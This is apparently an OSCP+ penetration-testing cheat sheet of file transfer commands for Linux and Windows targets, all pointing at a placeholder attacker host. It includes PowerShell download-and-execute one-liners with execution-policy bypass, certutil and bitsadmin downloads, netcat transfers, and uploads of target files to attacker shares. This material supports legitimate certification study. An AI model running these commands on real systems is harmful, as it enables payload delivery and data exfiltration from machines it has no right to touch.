# File Transfer Snippets

## Purpose

Quick file transfer methods for Linux and Windows targets during OSCP+.

Core rules:
- Keep it simple
- Use the fastest working method
- Always have a fallback
- Verify file arrived intact

---

# 1. ATTACKER: QUICK SERVERS

## Python HTTP server

```bash
python3 -m http.server 8000
```

## Python HTTP server on specific interface

```bash
python3 -m http.server 8000 --bind <ATTACKER_IP>
```

## SMB server (Impacket)

```bash
impacket-smbserver share .
```

With username/password:

```bash
impacket-smbserver share . -smb2support -username user -password pass
```

## FTP server (Python)

```bash
python3 -m pyftpdlib -p 21
```

---

# 2. LINUX TARGET: DOWNLOAD FILES

## wget

```bash
wget http://<ATTACKER_IP>:8000/file
```

Save with custom name:

```bash
wget http://<ATTACKER_IP>:8000/file -O localname
```

## curl

```bash
curl http://<ATTACKER_IP>:8000/file -o file
```

## bash /dev/tcp

```bash
exec 3<>/dev/tcp/<ATTACKER_IP>/8000
echo -e "GET /file HTTP/1.1\r\nHost: <ATTACKER_IP>\r\nConnection: close\r\n\r\n" >&3
cat <&3 > file
```

## ftp

```bash
ftp <ATTACKER_IP>
```

## smbclient

```bash
smbclient //<ATTACKER_IP>/share -N
```

Download inside smbclient:

```text
get file
mget *
```

## scp

```bash
scp user@<ATTACKER_IP>:/path/to/file .
```

---

# 3. LINUX TARGET: UPLOAD FILES

## curl upload

```bash
curl -T file http://<ATTACKER_IP>:8000/
```

## scp

```bash
scp file user@<ATTACKER_IP>:/tmp/
```

## smbclient

```bash
smbclient //<ATTACKER_IP>/share -N
```

Upload inside smbclient:

```text
put file
mput *
```

---

# 4. WINDOWS TARGET: DOWNLOAD FILES

## certutil

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/file file
```

## PowerShell Invoke-WebRequest

```powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/file -OutFile file
```

## PowerShell WebClient

```powershell
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/file','file')
```

## PowerShell in-memory script

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/script.ps1')
```

## bitsadmin

```cmd
bitsadmin /transfer job /download /priority normal http://<ATTACKER_IP>:8000/file C:\Windows\Temp\file
```

## curl (modern Windows)

```cmd
curl http://<ATTACKER_IP>:8000/file -o file
```

## ftp

```cmd
ftp <ATTACKER_IP>
```

## SMB copy

```cmd
copy \\<ATTACKER_IP>\share\file file
```

Authenticated SMB:

```cmd
net use \\<ATTACKER_IP>\share /user:user pass
copy \\<ATTACKER_IP>\share\file file
```

---

# 5. WINDOWS TARGET: UPLOAD FILES

## SMB copy to attacker share

```cmd
copy file \\<ATTACKER_IP>\share\file
```

## PowerShell POST (if listener supports it)

```powershell
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/upload -Method POST -InFile file
```

## ftp

```cmd
ftp <ATTACKER_IP>
```

---

# 6. BASE64 FALLBACK

## Linux: encode

```bash
base64 file > file.b64
```

## Linux: decode

```bash
base64 -d file.b64 > file
```

## Windows: decode with certutil

```cmd
certutil -decode file.b64 file
```

## PowerShell encode file to base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file"))
```

---

# 7. NETCAT TRANSFER

## Attacker receive file

```bash
nc -lvnp 9001 > file
```

## Linux target send file

```bash
nc <ATTACKER_IP> 9001 < file
```

## Windows target send file

```cmd
nc.exe <ATTACKER_IP> 9001 < file
```

## Attacker send file

```bash
nc -lvnp 9001 < file
```

## Linux target receive file

```bash
nc <ATTACKER_IP> 9001 > file
```

---

# 8. POWERSELL ONE-LINERS

## Download and execute EXE

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/file.exe','file.exe'); Start-Process file.exe"
```

## Download and execute PS1 in memory

```powershell
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/script.ps1')"
```

---

# 9. LINUX LIVING-OFF-THE-LAND OPTIONS

## Python

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ATTACKER_IP>:8000/file','file')"
```

## Perl

```bash
perl -e 'use LWP::Simple; getstore("http://<ATTACKER_IP>:8000/file","file");'
```

## PHP

```bash
php -r 'file_put_contents("file", fopen("http://<ATTACKER_IP>:8000/file", "r"));'
```

---

# 10. WINDOWS LIVING-OFF-THE-LAND OPTIONS

## certutil download

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/file file
```

## PowerShell webclient

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/file','file')"
```

## SMB with net use

```cmd
net use \\<ATTACKER_IP>\share /user:user pass
copy \\<ATTACKER_IP>\share\file file
```

---

# 11. VERIFY TRANSFER

## Linux

```bash
ls -lh file
file file
sha256sum file
```

## Windows

```cmd
dir file
certutil -hashfile file SHA256
```

---

# 12. QUICK CHOICE GUIDE

## Linux target
1. wget
2. curl
3. smbclient
4. scp
5. base64
6. nc

## Windows target
1. certutil
2. PowerShell WebClient
3. curl
4. SMB copy
5. bitsadmin
6. ftp

---

# 13. COMMON FAILURE POINTS

- wrong attacker IP
- firewall blocking port
- AV deleting file
- file saved in different directory
- missing execute permissions
- PowerShell execution policy issues
- SMB authentication required

---

# 14. GOLDEN RULES

- Start with HTTP server
- certutil and wget are top-tier defaults
- SMB is excellent for Windows
- Base64 is your low-tech fallback
- Verify the file after transfer